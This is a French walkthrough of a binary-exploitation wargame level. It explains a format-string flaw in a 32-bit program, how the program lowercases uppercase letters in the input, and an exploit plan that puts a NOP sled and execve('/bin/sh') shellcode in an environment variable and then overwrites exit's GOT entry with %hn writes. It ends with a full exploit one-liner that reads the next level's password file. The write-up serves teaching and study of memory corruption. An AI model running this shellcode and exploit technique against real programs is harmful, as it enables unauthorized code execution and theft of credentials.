# level 5 #

Pour réussir cet exercice, on va devoir utiliser un exploit dit de format string : en gros, une variable unique, non checkée, passée directement à `printf()`.

Déjà il faut comprendre ce que fait l'exécutable. 

```
lea    eax, [esp+0x28]
mov    DWORD PTR [esp], eax
call   8048350 <fgets@plt>        fgets(buffer, 100, stdin)

cmp    al, 0x40                   vérifie si buffer[i] est inférieur ou egal à 64 
jle    80484cb
cmp    al, 0x5a                  check si le buffer[i] est superieur à 90 
jg     80484cb
xor    edx, 0x20                 effectue un xor sur buffer[i] si c'est une lettre majuscules, la transforme en minuscule

lea    eax, [esp+0x28]
mov    DWORD PTR [esp], eax
call   8048340 <printf@plt>       printf(buffer) -> exploitable 
mov    [esp], 0x0
call   8048370 <exit@plt>         exit(0)
```

La string donnée par l'utilisateur est directement passée à `printf()` comme format: on peut donc lire toute la stack avec des `%x` et des `%p`, mais  surtout écrire dessus avec `%n` ou `%hn`.

Mais avant d'être passé à `printf`, tous les charactères alphabétiques en majuscules de notre input sont transformés en minisucle (et donc leur valeur change).
On doit donc éviter toute valeur comprise entre `0x41 et 0x5A` dans notre payload, sinon il ne fonctionnera pas. 

Déjà pour l'exploit de formatstring, on est tranquille avec des `$`, `%`et des flags en minuscule. 

Parcontre pour un shellcode tout entier, on risque d'avoir des octets dont la valeur se trouvent sur cette plage interdite. 

Du coup, la strat c'est de mettre le payload dans une variable d'environnement, après un ensemble de NOP (une instruction qui dit au cpu "ne fait rien, passe  à l'instruction d'après") : `x90`. 
On va donc mettre un payload de 1000 `x90`, puis le shellcode habituel de 21 octets qui exécute `execve("/bin/sh")`.

```bash
export PAYLOAD=$(python -c 'print "\x90" * 1000 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```

Déjà on doit identifier une adresse sur la stack où se trouve les variable d'env, et plus exactement notre "nop sled", notre cascade d'instruction qui fait glisser l'exec jusqu'à notre payload. 

On identifie assez facilement l'addresse `0xFFFFDC64`... Mais si on l'observe un peu, on réalise qu'elle commence par "FFFF"...Ca valeur décimale est donc assez énorme... Et ça risque d'être compliqué de print autant de caractères avec `printf()`. 

On va donc écrire en deux fois cette valeur, en écrivant les octets 2 par deux pour constituer un int à la fin, et pour faire ça on va utiliser le flag `hn` de printf. 

Après, il faut récupérer l'adresse d'`exit()` sur la global offset table, pour réécrire par dessus l'adresse identifiée dans la stack.

```
08048370 <exit@plt>:
 8048370:  ff 25 e0 97 04 08   jmp DWORD PTR ds:0x80497e0    la GOT d'exit
```
On va "diviser" cette addresse en deux parties de 2octets : `080497e0` pour le début de l'adresse `(DC64)` et `080497e2` pour la fin de l'adresse `(FFFF)`. 

En utilisant le format string de printf() et les %p, on va pouvoir déterminer que notre input se trouve au 10ème emplacement sur la stack. 

On doit donc craft notre payload de la façon suivante: 

- `\xe0\x97\x04\x08` et `\xe2\x97\x04\x08` les deux adresses (et ça représente déjà 8 octets prints par `printf()`)
- `%56412c` du pading calculé en prenant la valeur visée (0xDC64 soit 56420) moins 8 octets déjà prints 56420 - 8 = 56412
- `%10$hn` pour faire écrire le nombre d'octets déjà prints au 10ème emplacement de la stack (là ou se trouve la premiere adresse de notre input `0x080497e0`), sur 2 octets
- `%9115c` pour ajouter le padding restant pour arriver au nombre d'octets à prints (65535 octets) représentant la valeur haute de l'adresse visée (0xFFFF) : 65535 - 56420 = 9115
- `%11$hn` écrit `0xFFFF` (2 octets) au 11ᵉ argument, deuxième morceau d'adresse dans notre input (`0x080497e2`)

Et voilà notre exploit final : 

```bash
export PAYLOAD=$(python -c 'print "\x90" * 1000 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'); (python -c 'print ("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" "%56412c" + "%10$hn" + "%9115c" + "%11$hn")'; echo cat /home/users/level06/.pass) | ./level05
```
